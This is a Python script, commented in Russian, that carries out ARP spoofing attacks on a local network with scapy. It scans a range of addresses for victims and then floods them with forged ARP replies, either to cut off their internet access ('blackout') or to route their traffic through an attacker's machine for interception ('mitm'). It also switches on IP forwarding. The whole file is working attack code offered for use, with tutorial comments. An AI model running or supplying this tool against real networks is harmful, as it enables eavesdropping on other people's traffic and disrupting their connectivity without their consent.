import os
import re
import time
import argparse as args


""" Программа для осуществления атаки на протокол ARP.
    Работает только в пределах локальной сети, позволяет 
    отключать интернет у отдельных клиентов и перенаправлять
    их трафик на другие машины - атака человек посередине.

    Для знакомства с данным видом атак гуглим
    "ARP Spoofing", "Man in the middle attack"

    Для работы программы нужен Python 3.8 и права root,
    можно запускать ее под sudo.

"""


""" Импортируем модуль scapy для работы с сетью
    на уровне сетевых пакетов - очень мощная штука,
    рекомендую ознакомиться с ней поближе.

    Если этот модуль не установлен, то программа выдаст
    сообщение об ошибке.

"""
try:
    from scapy.all import *
except ModuleNotFoundError:
    print("\nYou are have not module 'scapy'! Exiting...\n")
    exit()


""" Функция для парсинга аргументов командной строки.
    
    Тут у нас 4 общих аргумента и две команды:
    blackout и mitm - отключить интернет и прослушивать чужой трафик соответственно.

    Аргументы можно указывать как в короткой форме, так и в длинной форме.

    На вход подаются несколько параметров. Там, где required=False - параметр необязательный
    --delay - задержка основного цикла, где происходит атака. Нужна, чтобы эмулировать ошибки
                интернет-соединения.

    --gateway - IP-адрес шлюза. Его должен знать сам атакующий. Обычно шлюз - это роутер.

    --range - IP-адрес нашей жертвы. Или диапазон адресов, который нужно просканировать
                и выбрать себе жертву. Удобно, когда ты не знаешь, кто на каком адресе находится.

    --time - по умолчанию атака будет продолжаться, пока атакующий сам не закроет эту программу
              сочетанием клавиш Ctrl+C.
              Если необходимо производить атаку некоторое время, то указываем этим параметром,
              сколько минут будет идти атака. Через это количество времени программа сама завершит
              свою работу.

    Далее у нас есть две команды - blackout и mitm.
    Команда blackout не имеет своих специфических параметров, поэтому с ней все ясно.

    А вот у команды mitm есть необязательный параметр:
    --attacker - IP-адрес устройства, на который нужно пустить трафик жертвы. Если ты хочешь
                  пропускать чужой трафик через свой комп, то этот параметр указывать не нужно!

    Для прослушивания чужого трафика необходимо включить ip forwarding на устройстве, через которое
    будет проходить трафик жертвы. Для отлова трафика естественно используем Wireshark или его консольные
    аналоги - tshark или tcpdump.


"""
def CreateArgParser():

    arg_parser = args.ArgumentParser()
    arg_parser.add_argument('-d', '--delay', type=int, default=1, required=False, metavar="Nums of seconds",\
        help="Delay to simulate network failure")
    arg_parser.add_argument('-g', '--gateway', type=str, required=True, metavar="IP address", help="IP address of network gateway")
    arg_parser.add_argument('-r', '--range', type=str, required=True, metavar="nmap targets", help="Range of scanning ip addresses")
    arg_parser.add_argument('-t', '--time', type=int, default=-1, required=False, metavar="Nums of minutes",\
        help="Number of minutes for attack")

    subparsers = arg_parser.add_subparsers(dest='command')

    blackout_subparser = subparsers.add_parser('blackout')

    mitm_subparser = subparsers.add_parser('mitm')
    mitm_subparser.add_argument('-a', '--attacker', type=str, default='local', required=False, metavar="IP address",\
        help="IP address of attacker. NOT YOU!")
    

    return arg_parser.parse_args()


""" Функция получения MAC-адреса устройства по IP-адресу.
    Аргумент range_ip_address - ip-адрес или диапазон адресов.

    Производит широковещательный ARP запрос.
    Гуглим "ARP protocol" и "Python Scapy ARP"

"""
def get_mac(range_ip_address):

    scan_res = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=range_ip_address),\
        timeout=2, verbose= False)[0]
    ret_targets_list = []
    for i in range(len(scan_res)):
        ret_targets_list.append((scan_res[i][1].psrc, scan_res[i][1].hwsrc))

    return ret_targets_list


""" Основная функция программы, здесь происходит magic


"""
def main():

    # Проверяем, запущена ли программа от root? Если нет - выходим
    if os.getuid():
        print("\nPlease, run this program as root! Exiting...\n")
        exit()


    # Парсим аргументы командной строки
    namespace = CreateArgParser()

    GATEWAY_IP = namespace.gateway
    GATEWAY_MAC = get_mac(GATEWAY_IP)
    if GATEWAY_MAC:
        GATEWAY_MAC = GATEWAY_MAC[0][1]
    else:
        print("Invalid gateway IP! Exiting...\n")
    TARGET_RANGE = namespace.range

    suitable_hosts = []

    # Программе можно подавать на вход как один IP-адрес, так и диапазон.
    #  Но диапазон должен быть только в последнем байте адреса, например,
    #  192.168.1.2-100
    #  Чтобы понять, что тут происходит,
    #  гуглим "Regular Expressions"
    ip_parts = TARGET_RANGE.split('-')
    ip_base = re.split(r'[\d]{1,3}$', ip_parts[0])[0]
    start_num = int(re.findall(r'[\d]{1,3}$', ip_parts[0])[0])

    if len(ip_parts) == 2:
        end_num = int(ip_parts[1]) + 1
    else:
        end_num = start_num + 1


    # Начинаем сканирование сети
    print("\nScanning target range...\n\n")

    # Формируем список IP-адресов, котрые нужно просканировать
    ip_list = ["{}{}".format(ip_base, i) for i in range(start_num, end_num)]

    # Получаем MAC адрес для каждого IP-адреса из данного списка
    suitable_hosts = get_mac(ip_list)

    # Печатаем, какие хосты у нас активны в сети
    print("Up hosts:\n")

    # Если нашелся только один хост, то программа предложит атаковать его
    if len(suitable_hosts) == 1:
        decigion = input("There is one host: \nIP: {}\nMAC: {}\n\n"
            "Do you wish to attack them? [Y/n]".format(suitable_hosts[0][0], suitable_hosts[0][1]))
        decigion = decigion.upper()
        if decigion == "N" or decigion == "NO":
            print("Attack is cancel! Exiting...\n")
            exit()
        targets = [suitable_hosts[0]]

    # Если нашлось много хостов, то программа выведет их все на экран под номерами,
    #  и можно выбрать, какие из них нужно атаковать. Номера можно перечислять через
    #  запятую, либо указывать диапазон, например, 3-10.
    elif suitable_hosts:
        count = 0
        for host in suitable_hosts:
            print("{}. IP address: {}\n   MAC address: {}\n".format(count, host[0], host[1]))
            count += 1

        targets = []
        target_nums = re.findall(r'[\d-]+', input("Enter indices of targets: "))

        for num in target_nums:
            temp = num.split('-')
            if len(temp) == 2:
                targets += suitable_hosts[int(temp[0]):int(temp[1]) + 1]
            else:
                targets.append(suitable_hosts[int(temp[0])])
    else:
        print("There is no up hosts! Exiting...\n")
        exit()


    if not targets:
        print("List of targets are empty! Exiting...\n")
        exit()

    ATTACK_TIME = namespace.time
    LOOP_DELAY = namespace.delay


    # Выясняем, какую команду мы запустили. Тут все просто:
    #  если выполняем blackout, то подменяем MAC шлюза на
    #  рандомный MAC - очень низкая вероятность, что
    #  такой MAC есть в вашей локальной сети
    if namespace.command == 'blackout':
        fake_gateway = str(RandMAC())

    # Если запустили mitm, то подменяем MAC шлюза на
    #  MAC атакующего
    elif namespace.command == 'mitm':
        if namespace.attacker == 'local':
            if os.name == 'nt':
                input("Attention! You are using Windows."
                      " To continue the attack please turn on ip"
                      " forwarding and press any key!")
            else:
                print("Turn on ip forwarding...\n")
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

        if namespace.attacker != 'local':
            temp = get_mac(namespace.attacker)
            if temp:
                fake_gateway = temp[0]
            else:
                print("Cannot to find attacker MAC address! Exiting...\n")
                exit()
        else:
            fake_gateway = None

    else:
        print("Unknown command! Exiting...\n")
        exit()

    # Генерируем пакеты, которые будем отсылать жертве и шлюзу
    print("Creating packets...")
    if fake_gateway:
        spoof_packets = [ARP(op='is-at', pdst=trg[0], hwdst=trg[1],\
            psrc=GATEWAY_IP, hwsrc=fake_gateway) for trg in targets]
    else:
        spoof_packets = [ARP(op='is-at', pdst=trg[0], hwdst=trg[1],\
            psrc=GATEWAY_IP) for trg in targets]


    # Генерируем пакеты для воостановления исходной конфигурации.
    #  В принципе, после завершения атаки конфигурация сама восстановится и
    #  без этих пакетов, но, на всякий случай все же их отошлем
    restore_packets = [ARP(op='is-at', pdst=trg[0], hwdst=trg[1],\
            psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC) for trg in targets]

    if ATTACK_TIME > 0:
        ATTACK_TIME *= 60
        start_time = time.time()

    # Ради этого простого цикла мы проделали все предыдущие шаги.
    #  К сожалению, недостаточно отослать по одному пакету и шлюзу,
    #  и жертве - нужно долбить их пакетами беспрерывно
    print("Starting attack...")
    try:
        while ATTACK_TIME:
            send(spoof_packets, verbose=False)
            if (ATTACK_TIME > 0) and (time.time() - start_time >= ATTACK_TIME):
                break
            #time.sleep(LOOP_DELAY)
    except KeyboardInterrupt:
        pass

    # Завершаем атаку либо по времени, либо по нажатию Ctrl+C
    #  Напоследок отсылаем пакеты для восстановления конфигурации сети
    #  Выходим
    print("Stopped attack...")
    send(restore_packets, verbose=False)
    if namespace.command == 'mitm':
        if namespace.attacker == 'local':
            if os.name == 'nt':
                print("Please, turn off ip forwarding")
            else:
                print("Turn off ip forwarding...\n")
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


    print("Command {} completed. Exiting...\n".format(namespace.command))


if __name__ == "__main__":
    main()
